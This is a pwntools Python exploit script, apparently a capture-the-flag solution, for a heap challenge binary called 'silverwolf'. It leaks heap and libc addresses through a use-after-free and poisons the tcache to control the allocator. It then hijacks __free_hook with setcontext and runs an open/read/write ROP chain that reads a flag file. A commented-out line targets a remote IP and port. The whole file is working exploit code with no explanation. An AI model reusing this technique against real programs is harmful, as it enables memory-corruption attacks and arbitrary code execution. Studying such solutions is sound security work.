#coding:UTF-8
from pwn import *
# context.log_level = 'debug'
# p = remote('124.71.224.30',20990)
elf = ELF('./silverwolf')
p = elf.process()
# libc = ELF('libc-2.27.so')
context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx,size):
    p.recvuntil("Your choice: ")
    p.sendline('1')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))

def edit(idx,con):
    p.recvuntil("Your choice:")
    p.sendline('2')
    p.recvuntil("Index:")
    p.sendline(str(idx))
    p.recvuntil("Content:")
    p.sendline(con)

def show(idx):
    p.recvuntil("Your choice: ")
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil("Your choice: ")
    p.sendline('4')
    p.recvuntil("Index:")
    p.sendline(str(idx))

for i in range(7):
    add(0,0x78)
    # edit(0,'a')

for i in range(2):
    # edit(0,'\x00'*0x10)
    delete(0)

show(0)
p.recvuntil('Content: ')
heap_base = u64(p.recv(6).ljust(8,'\x00')) & 0xfffffffff000
info("heap_base: " + hex(heap_base))
edit(0,p64(heap_base + 0x10))
add(0,0x78)
add(0,0x78)
edit(0,'\x00'*0x23+'\x07')
delete(0)
show(0)
p.recvuntil('Content: ')
libc_addr = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - 0x70 - libc.sym['__malloc_hook']
info('libc_addr: ' + hex(libc_addr))
# gdb.attach(p)

libc.address = libc_addr
system = libc.symbols['system']
free_hook = libc.sym['__free_hook']
set_context = libc.sym['setcontext'] + 53
mprotect = libc.sym['mprotect']

info('system: '+ hex(system))
info("free_hook: " + hex(free_hook))
info("setcontext: " + hex(set_context))
# info("mprotect: " + hex(mprotect))

payload = '\x02'*0x40 + p64(free_hook) + p64(0)
payload += p64(heap_base + 0x1000)  #flag 0x40
payload += p64(heap_base + 0x2000)  #stack 0x50
payload += p64(heap_base + 0x20a0)  #stack 0x60
payload += p64(heap_base + 0x3000)  #orw 0x70
payload += p64(heap_base + 0x3000 + 0x60) #orw 0x80
edit(0,payload)

ret = libc_addr + 0x00000000000008aa # ret
pop_rdi_ret = libc_addr + 0x000000000002155f # pop rdi ; ret
pop_rsi_ret = libc_addr + 0x0000000000023e8a # pop rsi ; ret 
#pop_rdx_rsi_ret = libc_addr + 0x0000000000130569 # pop rdx ; pop rsi ; ret
pop_rdx_ret = libc_addr + 0x0000000000001b96 # pop rdx ; ret
pop_rax_ret = libc_addr + 0x0000000000043a78

Open = libc.sym['open']
Read = libc.sym['read']
# info(hex(Read))
Write = libc.sym['write']
syscall = libc_addr + 0x11018F
FLAG  = heap_base + 0x1000
info("FLAG: " + hex(FLAG))
orw  = p64(pop_rdi_ret) + p64(FLAG)
orw += p64(pop_rsi_ret) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(syscall)

orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rsi_ret) + p64(heap_base + 0x3000)
orw += p64(pop_rdx_ret) + p64(0x21)
orw += p64(Read)

orw += p64(pop_rdi_ret) + p64(1)
orw += p64(Write)

add(0,0x18)
edit(0,p64(set_context))

add(0,0x38)
edit(0,'./flag\x00')
add(0,0x68)
edit(0,orw[:0x60])
add(0,0x78)
edit(0,orw[0x60:])
add(0,0x58)
edit(0,p64(heap_base + 0x3000) + p64(ret))
add(0,0x48)  #rdi = heap+0x2000
# gdb.attach(p)
delete(0)

# raw_input()
p.interactive()
